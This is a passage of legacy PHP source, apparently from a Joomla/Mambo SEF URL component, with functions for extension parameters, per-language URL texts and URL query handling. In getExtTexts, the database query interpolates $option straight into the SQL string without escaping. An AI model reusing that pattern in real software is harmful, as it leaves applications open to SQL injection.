            return null;
        }
        $element = &$root->getElementsByPath('name', 1);
        return ($element ? $element->getText() : '');
    }
    /** Returns mosParameters object representing extension's parameters
     *
     * @param	string          Extension name
     * @return	mosParameters   Extension's parameters
     */
    function getExtParams ($option)
    {
        global $database, $mosConfig_absolute_path;
        static $params;
        if (! isset($params))
            $params = array();
        if (! isset($params[$option])) {
            $row = new mosExt($database);
            $row->load($option . '.xml');
            $path = $mosConfig_absolute_path . "/components/com_sef/sef_ext/$option.xml";
            if (! file_exists($path)) {
                $path = '';
            }
            $params[$option] = new mosParameters($row->params, $path, 'sef_ext');
        }
        return $params[$option];
    }
    /** Returns the array of texts used by the extension for creating URLs
     *  in currently selected language (for JoomFish support)
     *
     * @param	string  Extension name
     * @return	array   Extension's texts
     */
    function getExtTexts ($option, $lang = '')
    {
        global $database, $mosConfig_lang;
        static $extTexts;
        if ($option == '')
            return false;
            // Set the language
        if ($lang == '')
            $lang = $mosConfig_lang;
        if (! isset($extTexts))
            $extTexts = array();
        if (! isset($extTexts[$option]))
            $extTexts[$option] = array();
        if (! isset($extTexts[$option][$lang])) {
            $extTexts[$option][$lang] = array();
            // If lang is different than current language, change it
            if ($lang != $mosConfig_lang) {
                $oldLang = $mosConfig_lang;
                $mosConfig_lang = $lang;
            }
            $query = "SELECT `id`, `name`, `value` FROM `#__sefexttexts` WHERE `extension` = '$option'";
            $database->setQuery($query);
            $texts = $database->loadObjectList();
            if (is_array($texts) && (count($texts) > 0)) {
                foreach (array_keys($texts) as $i) {
                    $name = $texts[$i]->name;
                    $value = $texts[$i]->value;
                    $extTexts[$option][$lang][$name] = $value;
                }
            }
            // Set the language back to previously selected one
            if (isset($oldLang) && ($oldLang != $mosConfig_lang)) {
                $mosConfig_lang = $oldLang;
            }
        }
        return $extTexts[$option][$lang];
    }
    function sortURLvars ($string)
    {
        $pos = strpos($string, '?');
        if ($pos === false)
            return $string;
        $firstPart = substr($string, 0, $pos + 1);
        $secondPart = substr($string, $pos + 1);
        $urlVars = explode('&', $secondPart);
        // make params unique and order them
        $urlVars = array_unique($urlVars);
        sort($urlVars);
        // search for option param and remove it from array
        for ($i = 0; $i < count($urlVars); $i ++) {
            if (strpos($urlVars[$i], 'option=') === 0) {
                $opt = $urlVars[$i];
                unset($urlVars[$i]);
            }
        }
        // readd option to the beginning of the
        if (isset($opt))
            array_unshift($urlVars, $opt);
        $secondPart = implode('&', $urlVars);
        $string = $firstPart . $secondPart;
        return $string;
    }
    function RemoveVariable ($url, $var, $value = '')
    {
        if ($value == '') {
            //$newurl = eregi_replace("$var=[^&]*", '', $url);
            $newurl = preg_replace("/$var=[^&]*/i", '', $url);
        } else {
            $newurl = str_replace($var . '=' . $value, '', $url);
        }
        $newurl = trim($newurl, '&?');
        $trans = array('&&' => '&' , '?&' => '?');
        $newurl = strtr($newurl, $trans);
        return $newurl;
    }
}
class SEFUpgradeFile
{
    var $operation = '';
    var $packagePath = '';
    function SEFUpgradeFile ($op, $path)
    {
        $this->operation = $op;
        $this->packagePath = $path;
    }
}
?>
